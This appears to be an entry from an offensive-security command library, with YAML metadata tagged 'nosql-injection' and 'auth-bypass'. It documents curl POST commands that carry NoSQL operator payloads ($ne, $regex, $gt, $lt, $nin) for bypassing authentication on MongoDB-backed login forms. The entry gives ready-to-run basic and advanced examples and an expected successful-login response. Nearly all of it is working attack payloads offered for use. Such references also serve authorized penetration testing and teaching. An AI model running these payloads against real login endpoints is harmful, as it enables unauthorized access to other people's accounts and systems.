---
id: 3ad52d85-86ec-4ed1-ac32-b5df603e8dc4
name: curl-nosql-injection-auth-bypass-form
type: command
executor: bash
data: >-
  curl -X POST -d 'username[$ne]=toto&password[$ne]=toto' $_TARGET_URL

  curl -X POST -d 'login[$regex]=a.*&pass[$ne]=lol' $_TARGET_URL

  curl -X POST -d 'login[$gt]=admin&login[$lt]=test&pass[$ne]=1' $_TARGET_URL

  curl -X POST -d 'login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto'
  $_TARGET_URL
output: null
created_at: '2023-04-06T03:56:31.414995+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - nosql-injection
  - auth-bypass
verified: true
validated: true
---

# curl-nosql-injection-auth-bypass-form

## Command

```bash
curl -X POST -d 'username[$ne]=toto&password[$ne]=toto' $_TARGET_URL
```

## Description

Sends a form-encoded HTTP POST request with NoSQL injection payload using operators like $ne, $regex, $gt, $lt, and $nin to bypass authentication in MongoDB-backed login forms.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The login endpoint URL (e.g., http://target.com/login) | Yes |
| -d | Data payload for POST | Built-in |
| -X POST | Specify POST method | Built-in |

## Examples

### Basic Usage

```bash
curl -X POST -d 'username[$ne]=toto&password[$ne]=toto' http://target.com/login
```

### Advanced Usage

```bash
curl -X POST -d 'login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto' http://target.com/login
```

## Expected Output

HTTP/1.1 200 OK
Set-Cookie: session=abc123; Path=/
Location: /dashboard

(Indicates successful authentication and redirect.)

## Related

- [[procedures/NoSQL-Injection-Authentication-Bypass-Using-Not-Equal-or-Greater]]
